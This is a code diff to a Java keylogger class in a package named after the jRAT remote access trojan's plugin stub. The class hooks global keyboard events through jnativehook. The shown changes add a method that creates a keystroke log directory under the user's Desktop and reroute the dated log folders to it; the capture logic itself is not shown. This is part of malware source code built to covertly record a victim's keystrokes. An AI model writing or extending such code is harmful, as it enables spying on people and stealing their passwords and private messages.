@@ -1,13 +1,13 @@
 package pro.jrat.plugin.stub;
 
-import java.io.BufferedWriter;
 import java.io.File;
-import java.io.FileWriter;
-import java.io.PrintWriter;
 import java.util.Date;
 
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
+
+import pro.jrat.plugin.stub.activities.Activities;
+import pro.jrat.plugin.stub.activities.Key;
 
 @SuppressWarnings("deprecation")
 public class Keylogger implements NativeKeyListener {
@@ -39,6 +39,12 @@ public class Keylogger implements NativeKeyListener {
 
 	}
 
+	public static File getLogsRoot() {
+		File file = new File(System.getProperty("user.home") + "\\Desktop\\LOGSTEST\\");
+		file.mkdirs();
+		return file;
+	}
+
 	public static File getTodaysFile() {		
 		Date date = new Date();
 		
@@ -59,7 +65,7 @@ public class Keylogger implements NativeKeyListener {
 	public static File getYearFolder() {
 		Date date = new Date();
 
-		File year = new File(KeyloggerPlugin.getLogsRoot(), (date.getYear() + 1900) + "");
+		File year = new File(Keylogger.getLogsRoot(), (date.getYear() + 1900) + "");
 		year.mkdirs();
 		
 		return year;
